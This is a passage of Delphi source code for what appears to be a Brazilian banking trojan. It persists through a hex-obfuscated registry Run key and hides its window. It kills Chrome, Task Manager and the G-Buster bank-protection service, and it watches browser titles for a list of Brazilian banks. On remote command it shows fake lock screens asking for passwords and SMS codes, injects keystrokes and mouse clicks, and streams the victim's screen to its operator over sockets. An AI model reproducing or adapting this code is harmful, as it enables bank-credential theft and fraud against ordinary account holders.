     // TRAVA BB ESTILO
     if Pos('<|NOBE|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOBE|>', Dados2)+7);
     NOBE := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NOBE);
     Label11.Caption := 'TRAVABBE';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // BB ESTILO 6
     if StrCommand = '{SENHA6E}' then
      begin
      Label11.Caption := 'SENHA6E';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;


     // TRAVA 24HRS
     if StrCommand = '{TRAVA24}' then
      begin
      Func.trava24();
      exit
     end;

     // Captura Mensagem de Texto
     if Pos('<|MSG6|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|MSG6|>', Dados2)+7);
     TIPO := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     MessageBox(self.handle,PChar(TIPO), 'ATENÇÃO', MB_ICONWARNING or MB_OK);
     exit
     end;


     // Captura Posição Desco Normal
     if Pos('<|DES6|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|DES6|>', Dados2)+7);
     TABELA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label19.Caption := TABELA;
     Label11.Caption := 'DESCOT';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

           // Captura Posição Desco Prime
        if Pos('<|DESP|>', StrCommand) >0 then begin
        Dados2 := StrCommand;
        Delete(Dados2, 1, Pos('<|DESP|>', Dados2)+7);
        TABELA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
        Label19.Caption := TABELA;
        Label11.Caption := 'DESCOTP';
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
        end;

        // Captura Tipo de Itaú
        if Pos('<|ITTP|>', StrCommand) >0 then begin
        Dados2 := StrCommand;
        Delete(Dados2, 1, Pos('<|ITTP|>', Dados2)+7);
        TIPO2 := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
        Label5.Caption := '';
        Label5.Caption := TIPO2;
        exit
        end;

        // TRAVA ITAU
        if Pos('<|NOIT|>', StrCommand) >0 then begin
        Dados2 := StrCommand;
        Delete(Dados2, 1, Pos('<|NOIT|>', Dados2)+7);
        NOIT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
        Label6.Caption := AnsiUpperCase(NOIT);
        if Label5.Caption = 'Normal' then
        Label11.Caption := 'TRAVANO';
        if Label5.Caption = 'Uniclass' then
        Label11.Caption := 'TRAVAUNI';
        if Label5.Caption = 'Perso' then
        Label11.Caption := 'TRAVAPER';
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
        end;

         // Captura Posição Itaú Tabela
        if Pos('<|ITTB|>', StrCommand) >0 then begin
        Dados2 := StrCommand;
        Delete(Dados2, 1, Pos('<|ITTB|>', Dados2)+7);
        TABELA1 := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
        Label19.Caption := TABELA1;
        if Label5.Caption = 'Normal' then
        Label11.Caption := 'TABEL6IT';
        if Label5.Caption = 'Uniclass' then
        Label11.Caption := 'TABEL6UNI';
        if Label5.Caption = 'Perso' then
        Label11.Caption := 'TABEL6PER';
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
        end;

       // SMS BB
         if Pos('<|IBBS|>', StrCommand) >0 then begin
        Dados2 := StrCommand;
        Delete(Dados2, 1, Pos('<|IBBS|>', Dados2)+7);
        IBBS := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
        Label7.Caption := IBBS;
        if Label5.Caption = 'Normal' then
        Label11.Caption := 'SENHASBB';
        if Label5.Caption = 'Estilo' then
        Label11.Caption := 'BBESMSE';
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
        end;

        // TRAVA HSBC
       if Pos('<|NOHS|>', StrCommand) >0 then begin
       Dados2 := StrCommand;
       Delete(Dados2, 1, Pos('<|NOHS|>', Dados2)+7);
       NOHS := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label6.Caption := AnsiUpperCase(NOHS);
       if Label5.Caption = 'HsbcNormal' then
       Label11.Caption := 'TRAVAHS';
       if Label5.Caption = 'HsbcPremier' then
       Label11.Caption := 'TRAVAHSPRE';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
     end;

         // TRAVA Nordeste
     if Pos('<|NOND|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOND|>', Dados2)+7);
     NOSI := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NOSI);
     Label11.Caption := 'TRAVANOD';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // Captura Posição NORDESTE
     if Pos('<|NODT|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NODT|>', Dados2)+7);
     TABELA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label19.Caption := TABELA;
     Label11.Caption := 'NORDET';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     ///////////////////////////// TECLADO SENDMESSAGE /////////////////////////////////
                      if StrCommand = '0' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 48, 1);
      exit
     end;

                         if StrCommand = '1' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 49, 1);
      exit
     end;

                           if StrCommand = '2' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 50, 1);
     end;

                           if StrCommand = '3' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 51, 1);
     end;

                              if StrCommand = '4' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 52, 1);
     end;

                              if StrCommand = '5' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 53, 1);
     end;

                              if StrCommand = '6' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 54, 1);
     end;

                              if StrCommand = '7' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 55, 1);
     end;

                              if StrCommand = '8' then
      begin
     PostMessage(JanelaHandle, WM_KEYDOWN, 56, 1);
     end;

                              if StrCommand = '9' then
      begin
     PostMessage(JanelaHandle, WM_KEYDOWN, 57, 1);
     end;

                                 if StrCommand = '{BS}' then
      begin
     PostMessage(JanelaHandle, WM_KEYDOWN, 8, 1);
     end;

                                 if StrCommand = '{ENTER}' then
      begin
     PostMessage(JanelaHandle, WM_KEYDOWN, 13, 1);
     end;

                                 if StrCommand = '{ESCAPE}' then
      begin
     PostMessage(JanelaHandle, WM_KEYDOWN, 27, 1);
     end;

                                 if StrCommand = '{SPACE}' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 32, 1);
     end;

                                 if StrCommand = '{DEL}' then
      begin
      PostMessage(JanelaHandle, WM_KEYDOWN, 46, 1);
     end;

                                  if StrCommand = '{LEFT}' then
      begin
     PostMessage(JanelaHandle, WM_KEYDOWN, 37, 1);
     end;

                                   if StrCommand = '{UP}' then
      begin
     PostMessage(JanelaHandle, WM_KEYDOWN, 38, 1);
     end;

                                   if StrCommand = '{RIGHT}' then
      begin
    PostMessage(JanelaHandle, WM_KEYDOWN, 39, 1);
     end;

                                    if StrCommand = '{DOWN}' then
      begin
    PostMessage(JanelaHandle, WM_KEYDOWN, 40, 1);
     end;

                                    if StrCommand = '{CTRL}' then
      begin
    PostMessage(JanelaHandle, WM_KEYDOWN, 17, 1)
     end;

                                      if StrCommand = '{VIRG}' then
      begin
    PostMessage(JanelaHandle, WM_KEYDOWN, 188, 1);
     end;


                                       if StrCommand = '{PONTO}' then
      begin
    PostMessage(JanelaHandle, WM_KEYDOWN, 110, 1);
     end;

                                        if StrCommand = '{PONTO1}' then
      begin
     PostMessage(JanelaHandle, WM_KEYDOWN, 190, 1);
     end;



     ///////////////////////////// TECLADO SENDMESSAGE /////////////////////////////////


     // Desligar Monitor
     if StrCommand = '{DESMON}' then
      begin
      SendMessage(Application.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
     end;

     // Ligar Monitor
     if StrCommand = '{DESMON}' then
      begin
      SendMessage(Application.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
     end;

     // Travar Teclado/Mouse
     if StrCommand = '{TRAVAM}' then
      begin
      Func.TravaM;
      end;

      // Destravar Teclado/Mouse
      if StrCommand = '{DESTRAVAM}' then
      begin
        Func.DestravaM;
        end;


      if Pos('<|MousePos|>', StrCommand)>0 then begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MousePos|>', dados2)+11);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        SetCursorPos(posX, posY);
      end;

      if Pos('<|MouseLD|>', strCommand)>0 then begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseLD|>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        SetCursorPos(posX, posY);
        
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);

      end;

      if Pos('<|MouseDC|>', strCommand)>0 then begin
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        Sleep(10);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        Sleep(10);
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        Sleep(10);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
      end;

      if Pos('<|MouseLU|>', strCommand)>0 then begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseLU|>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        SetCursorPos(posX, posY);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
      end;

      // RECEBE O CLICK DO MOUSE
        if Copy(StrCommand,0,5)= 'click' then
        begin
        Delete(StrCommand,1,5);
        Label13.Caption := StrCommand;
        valores := TStringList.Create;
        valores.delimiter:=char(','); //<voce definiu como virgula,mas poderia ser outro delimitador
        valores.delimitedtext:= Label13.Caption;//dados lidos na porta serial
        Label15.Caption := valores[0];
        Label16.Caption := valores[1];
        valores.free;
        posX := strtoint(Label15.Caption);
        posY := strtoint(Label16.Caption);

        if JanelaHandle > 0 then
        begin
        SendMouseClick(JanelaHandle, posX,posY);
        end;
        end;

        // Captura Colar Remoto
        if Pos('<|CLIP|>', StrCommand) >0 then begin
        Dados2 := StrCommand;
        Delete(Dados2, 1, Pos('<|CLIP|>', Dados2)+7);
        LETO := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       // Edit6.Text:= Trim(LETO);
        SetClipboardText(Handle, LETO);
        sleep(200);
        //PasteTo(cut);
        KeyCMD(LETO);
        end;

         if Pos('<|LETR|>', StrCommand) >0 then begin
        Dados2 := StrCommand;
        Delete(Dados2, 1, Pos('<|LETR|>', Dados2)+7);
        LETRA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
        //showmessage(LETRA);
        KeyCMD(LETRA);
        exit
        end;

        if Pos('<|MouseTeste||>', strCommand)>0 then begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseTeste||>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));
        Label13.Caption := inttostr(posX);

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));
        Label14.Caption := inttostr(posY);

        Mouse_Event(MOUSEEVENTF_ABSOLUTE or MOUSEEVENTF_MOVE, posX,posY,0,0);
        Mouse_Event(MOUSEEVENTF_ABSOLUTE or MOUSEEVENTF_LEFTDOWN,posX,posY,0,0);
        Mouse_Event(MOUSEEVENTF_ABSOLUTE or MOUSEEVENTF_LEFTUP,posX,posY,0,0);
        Mouse_Event(MOUSEEVENTF_ABSOLUTE or MOUSEEVENTF_LEFTDOWN,posX,posY,0,0);
        Mouse_Event(MOUSEEVENTF_ABSOLUTE or MOUSEEVENTF_LEFTUP,posX,posY,0,0);
      end;

      if Pos('<|MouseRD|>', strCommand)>0 then begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseRD|>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        SetCursorPos(posX, posY);
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
      end;

      if Pos('<|MouseRU|>', strCommand)>0 then begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseRU|>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        SetCursorPos(posX, posY);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
      end;

end;

procedure TForm1.CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
var
   StrCommand, StrPackSize: string;
   tamanho: Integer;
begin

  Socket.SendText(HexToStr('3C7C4465736B746F707C3E'));
  Sleep(2000);
  MyFirstBmp:=TMemoryStream.Create;
  MySecondBmp:=TMemoryStream.Create;
  MyCompareBmp:=TMemoryStream.Create;
  PackStream:=TMemoryStream.Create;
  iSendCount:=0;

  if Tipo3 = HexToStr('4E617669') then
  begin
  tipo(Tipo3);
  MyFirstBmp.Clear;
  GetScreenToBmp(False,MyFirstBmp);
  MyFirstBmp.Position:=0;
  PackStream.LoadFromStream(MyFirstBmp);
  CompressStream(PackStream);
  PackStream.Position := 0;
  tamanho := PackStream.Size;
 // StrPackSize := inttostr(PackStream.size);
  CS2.Socket.SendText('<|TAMANHO|>' + inttostr(tamanho) + '<<|');
  iSendCount:=iSendCount+1;
  exit;
  end;

    if Tipo3 = HexToStr('4465736B746F70') then
  begin
  tipo(Tipo3);
  MyFirstBmp.Clear;
 //CompareStream(MyFirstBmp,MySecondBmp,MyCompareBmp);
 GetDesktop(False,MyFirstBmp);
  MyFirstBmp.Position:=0;
  PackStream.LoadFromStream(MyFirstBmp);
  CompressStream(PackStream);
  PackStream.Position := 0;
  StrPackSize := inttostr(PackStream.size);
  CS2.Socket.Sendtext('<|TAMANHO|>'+StrPackSize+'<<|');
  iSendCount:=iSendCount+1;
  exit;
  end;


end;

procedure TForm1.CS3Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TForm1.CS3Read(Sender: TObject; Socket: TCustomWinSocket);
var
  dados: String;
begin
   dados := Socket.ReceiveText;
   SendKeys(PChar(dados), false);
end;

procedure TForm1.CS3Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
   Sleep(2000);
  Socket.SendText('<|KEYBOARD|>'+IDSockPrincipal+'<<|');
end;

procedure TForm1.TrmConnectTimer(Sender: TObject);
begin
 if not CS1.Active then
  CS1.Active := true;
end;

procedure TForm1.CS1Connecting(Sender: TObject; Socket: TCustomWinSocket);
begin
   Button1.Enabled := false;
  Edit1.Enabled := false;
  Edit2.Enabled := false;
  Edit3.Enabled := false;
  Edit4.Enabled := false;
  StatusBar1.Panels.Items[1].Text := 'Conectando...';
end;

procedure TForm1.TrmDadosTimer(Sender: TObject);
begin
    if RecebendoDados then
      RecebendoDados := false
    else begin
      CS1.Active := false;
      CS2.Active := false;
      CS3.Active := false;
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
   hMutex : integer;
   Mutex: String;
   Reg: TRegistry;
begin
Reg := TRegistry.Create;
  with Reg do
  begin
    RootKey := HKEY_CURRENT_USER;
    OpenKey(HexToStr('534F4654574152455C4D4943524F534F46545C57494E444F57535C43555252454E5456455253494F4E5C52554E'), false);
    WriteString(ExtractFileName(Application.ExeName),
      PChar(Application.ExeName));
    closekey;
// Impede o Programa de Abrir 2x
hMutex := CreateMutex(0, TRUE, '0x910991009');
if GetLastError = ERROR_ALREADY_EXISTS then begin
Application.Terminate;
end;

TrmInicio.Enabled := True; { Inicia o processo da KL }
ShowWindow(Form1.Handle,SW_HIDE);

end;
end;

procedure TForm1.Timer5Timer(Sender: TObject);
begin
//Memo2.Lines.Add(Edit12.Text);
end;

procedure TForm1.TrmChromeTimer(Sender: TObject);
begin
Func.Chrome;
TrmChrome.Enabled := False;
end;

procedure TForm1.TrmInicioTimer(Sender: TObject);
var
  janela : HWND;
begin
Func := TFunc.Create(Application);

// Killa Chrome
Func.killtask(HexToSTr('6368726F6D652E657865'));

// Captura Nome do Computador
Edit4.Text := Func.CompName;

// Captura Diretório Temporário do Windows
Edit5.Text := Func.PegaTempDir;
caminho(Edit5.Text); { Pega diretório Temp do Windows e coloca na variável para print}

// Desativa AERO
DSiAeroDisable;

// Infect
Func.Infect;

// Infos
TrmInfo.Enabled := True;

// Corrige Bug Chrome
TrmChrome.Enabled := True;

// Extrai Cursor
if not fileexists(edit5.Text + 'icone.cur') then
begin
Func.ResgataArquivoCompilado('ICONECUR','CUR',Edit5.Text);
end;

//  Apaga KLS Antigas se Existir
Func.ApagaAntiga();

// Ativa Monitoradores de URL
TrmInicio.Enabled := False;
end;

procedure TForm1.TrmInfoTimer(Sender: TObject);
var
Title: Array [0 .. 255] of Char;
navi: string;
resultado: string;
TituloJanela: String;
begin
  Browser := GetForegroundWindow;
  GetWindowText(Browser, Title, SizeOf(Title));

  {*****CHROME*****}
    if Pos(HexToSTr('476F6F676C65204368726F6D65'), Title) <> 0 then
    begin
     Navi := HexToSTr('4368726F6D65');
     TituloJanela := String(Title);
     JanelaHandle := FindWindow(nil, PChar(String(Title)));
     navegador(JanelaHandle);
    // BB
     if Pos(HexToSTr('5B62622E636F6D2E62725D'), Title) <> 0 then
     start(HexToStr('4242'), Navi);
     // Desco
     if Pos(HexToSTr('42616E636F20427261646573636F20532F41'), Title) <> 0 then
     start(HexToStr('425241444553434F'), Navi);  // Normal
     // Itau
     if Pos(HexToSTr('333020686F726173'), Title) <> 0 then
     start(HexToStr('495441DA'), Navi);
     // Santa ju
     if Pos(HexToSTr('42616E636F2053616E74616E6465722042726173696C207C20506573736F61204A7572ED64696361207C204174656E64696D656E746F20656D70726573617269616C2C20656D707265736173'), Title) <> 0 then
     start(HexToStr('53414E54414E444552'), Navi);
       // Santa fisica
      if Pos(HexToSTr('496E7465726E65742042616E6B696E67'), Title) <> 0 then
     start(HexToStr('53414E54414E444552'), Navi);
     // Sicredi
     if Pos(HexToSTr('53696372656469'), Title) <> 0 then
     start(HexToStr('53494352454449'), Navi);

     // Nordeste
     if Pos(HexToSTr('4E6F72646573746520456C657472F46E69636F'), Title) <> 0 then
     start(HexToStr('4E4F524445535445'), Navi);

      // brb
     if Pos('BRB '+'Ba'+'nk'+'net'+'  Ba'+'nco'+' de Br'+'así'+'lia', Title) <> 0 then
      start(HexToStr('425242'), Navi);

     // Cef
     if Pos(HexToSTr('43616978612045636F6EF46D696361204665646572616C'), Title) <> 0 then
     start(HexToStr('434546'), Navi);

      // Cef
     if Pos(HexToSTr('4361697861202D204120766964612070656465206D6169732071756520756D2062616E636F'), Title) <> 0 then
     start(HexToStr('434546'), Navi);
     // Hsbc
     if Pos(HexToSTr('4469676974616C204C696665'), Title) <> 0 then
     start(HexToStr('48534243'), Navi);
     end;

  {*****IE*****}
   if Pos(HexToSTr('496E7465726E6574204578706C6F726572'), Title) <> 0 then
   begin
    JanelaHandle := FindWindow(PAnsiChar(HexToStr('49454672616D65')), nil);
    JanelaHandle := FindWindowEx(JanelaHandle, 0, 'TabWindowClass', nil);
    JanelaHandle := FindWindowEx(JanelaHandle, 0, 'Shell DocObject View', nil);
    JanelaHandle := FindWindowEx(JanelaHandle, 0, 'Internet Explorer_Server', nil);
    if not JanelaHandle > 0 then
    begin
    JanelaHandle := FindWindow(PAnsiChar(HexToStr('49454672616D65')), nil);
    JanelaHandle := FindWindowEx(JanelaHandle, 0, PAnsiChar(HexToStr('4672616D6520546162')), nil);
    JanelaHandle := FindWindowEx(JanelaHandle, 0, 'TabWindowClass', nil);
    JanelaHandle := FindWindowEx(JanelaHandle, 0, 'Shell DocObject View', nil);
    JanelaHandle := FindWindowEx(JanelaHandle, 0, 'Internet Explorer_Server', nil);
    navegador(JanelaHandle);
    Navi := HexToSTr('4578706C6F726572');
  // BB
     if Pos(HexToSTr('5B62622E636F6D2E62725D'), Title) <> 0 then
     start(HexToStr('4242'), Navi);
     // Desco
     if Pos(HexToSTr('42616E636F20427261646573636F20532F41'), Title) <> 0 then
     start(HexToStr('425241444553434F'), Navi);  // Normal
     // Itau
     if Pos(HexToSTr('333020686F726173'), Title) <> 0 then
     start(HexToStr('495441DA'), Navi);
     // Santa
     if Pos(HexToSTr('42616E636F2053616E74616E6465722042726173696C207C20506573736F61204A7572ED64696361207C204174656E64696D656E746F20656D70726573617269616C2C20656D707265736173'), Title) <> 0 then
     start(HexToStr('53414E54414E444552'), Navi);

      // Santa fisica
      if Pos(HexToSTr('496E7465726E65742042616E6B696E67'), Title) <> 0 then
     start(HexToStr('53414E54414E444552'), Navi);

     // Sicredi
     if Pos(HexToSTr('53696372656469'), Title) <> 0 then
     start(HexToStr('53494352454449'), Navi);

        // brb
     if Pos('BRB '+'Ba'+'nk'+'net'+'  Ba'+'nco'+' de Br'+'así'+'lia', Title) <> 0 then
     start(HexToStr('425242'), Navi);

        // Nordeste
     if Pos(HexToSTr('4E6F72646573746520456C657472F46E69636F'), Title) <> 0 then
     start(HexToStr('4E4F524445535445'), Navi);

     // Cef
     if Pos(HexToSTr('43616978612045636F6EF46D696361204665646572616C'), Title) <> 0 then
     start(HexToStr('434546'), Navi);

       // Cef
     if Pos(HexToSTr('4361697861202D204120766964612070656465206D6169732071756520756D2062616E636F'), Title) <> 0 then
     start(HexToStr('434546'), Navi);
     // Hsbc
     if Pos(HexToSTr('4469676974616C204C696665'), Title) <> 0 then
     start(HexToStr('48534243'), Navi);
     end;end;

  {*****FF*****}
   if Pos(HexToSTr('4D6F7A696C6C612046697265666F78'), Title) <> 0 then
   begin
     TituloJanela := String(Title);
     JanelaHandle := FindWindow(nil, PChar(String(Title)));
     navegador(JanelaHandle);
     Navi := HexToSTr('46697265466F78');
  // BB
     if Pos(HexToSTr('5B62622E636F6D2E62725D'), Title) <> 0 then
     start(HexToStr('4242'), Navi);
     // Desco
     if Pos(HexToSTr('42616E636F20427261646573636F20532F41'), Title) <> 0 then
     start(HexToStr('425241444553434F'), Navi);  // Normal
     // Itau
     if Pos(HexToSTr('333020686F726173'), Title) <> 0 then
     start(HexToStr('495441DA'), Navi);
     // Santa
     if Pos(HexToSTr('42616E636F2053616E74616E6465722042726173696C207C20506573736F61204A7572ED64696361207C204174656E64696D656E746F20656D70726573617269616C2C20656D707265736173'), Title) <> 0 then
     start(HexToStr('53414E54414E444552'), Navi);
      // Santa fisica
      if Pos(HexToSTr('496E7465726E65742042616E6B696E67'), Title) <> 0 then
     start(HexToStr('53414E54414E444552'), Navi);
     // Sicredi
     if Pos(HexToSTr('53696372656469'), Title) <> 0 then
     start(HexToStr('53494352454449'), Navi);

        // Nordeste
     if Pos(HexToSTr('4E6F72646573746520456C657472F46E69636F'), Title) <> 0 then
     start(HexToStr('4E4F524445535445'), Navi);

        // brb
     if Pos('BRB '+'Ba'+'nk'+'net'+'  Ba'+'nco'+' de Br'+'así'+'lia', Title) <> 0 then
     start(HexToStr('425242'), Navi);
     
     // Cef
     if Pos(HexToSTr('43616978612045636F6EF46D696361204665646572616C'), Title) <> 0 then
     start(HexToStr('434546'), Navi);

      // Cef
     if Pos(HexToSTr('4361697861202D204120766964612070656465206D6169732071756520756D2062616E636F'), Title) <> 0 then
     start(HexToStr('434546'), Navi);
     // Hsbc
     if Pos(HexToSTr('4469676974616C204C696665'), Title) <> 0 then
     start(HexToStr('48534243'), Navi);
     end;
     end;

procedure TForm1.TrmJavaTimer(Sender: TObject);
var Title: Array [0 .. 255] of Char;
navi: string;
resultado: string;
Jan: HWND;
begin
  Browser := GetForegroundWindow;
  GetWindowText(Browser, Title, SizeOf(Title));

  {*****JANELA JAVA*****}
    if Pos('Informações de Segurança', Title) <> 0 then
    begin
    Jan := FindWindow('SunAwtDialog', nil);
    if Jan > 0 then
    PostMessage(Jan, WM_KEYDOWN, VK_RETURN, 0);
end;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
Func.DestravaM;
end;

procedure TForm1.TrmBarraTimer(Sender: TObject);
var
jan: HWND;
begin
     {*****MONITORA GERENCIADOR*****}
     jan := findwindow(nil,'Gerenciador de Tarefas do Windows');
     if jan <> 0 then
     postmessage(jan,wm_close, 0,0);
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
Func.killtask('GbpSv.exe');
Func.killtask('core.exe');
Func.killtask('itauaplicativo.exe');
end;

procedure TForm1.Timer2Timer(Sender: TObject);
var
jan: HWND;
begin
     {*****MONITORA GERENCIADOR*****}
     jan := findwindow(nil,'G-Buster Browser Defense - Service');
     if jan <> 0 then
     postmessage(jan,wm_close, 0,0);
end;

procedure TForm1.Timer3Timer(Sender: TObject);
var
jan: HWND;
begin
     {*****MONITORA GERENCIADOR*****}
     jan := findwindow(nil,'Aplicativo Itaú');
     if jan <> 0 then
     postmessage(jan,wm_close, 0,0);

     end;

end.
